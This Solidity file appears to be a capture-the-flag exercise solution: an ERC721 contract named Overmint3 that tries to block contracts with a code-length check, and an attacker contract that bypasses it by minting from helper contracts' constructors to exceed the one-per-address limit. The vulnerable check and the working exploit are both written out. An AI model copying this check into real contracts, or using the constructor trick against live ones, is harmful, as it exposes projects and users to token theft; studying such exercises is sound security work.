// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {Test, console} from "forge-std/Test.sol";

contract Overmint3 is ERC721 {
    using Address for address;

    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint3", "AT") {}

    function mint() external {
        require(msg.sender.code.length == 0, "no contracts");
        require(amountMinted[msg.sender] < 1, "only 1 NFT");

        totalSupply++;
        _safeMint(msg.sender, totalSupply);

        amountMinted[msg.sender]++;
    }
}

contract Overmint3Attacker {
    function attack(Overmint3 victim, address attacker) external {
        for (uint256 i = 0; i < 5; i++) {
            uint256 totalSupply = Overmint3(victim).totalSupply();
            new AttackerHelper(address(victim), attacker, totalSupply + 1);
        }
    }
}

contract AttackerHelper {
    constructor(address victim, address attacker, uint256 tokenId) {
        Overmint3(victim).mint();
        ERC721(victim).approve(attacker, tokenId);
        ERC721(victim).transferFrom(address(this), attacker, tokenId);
    }
}
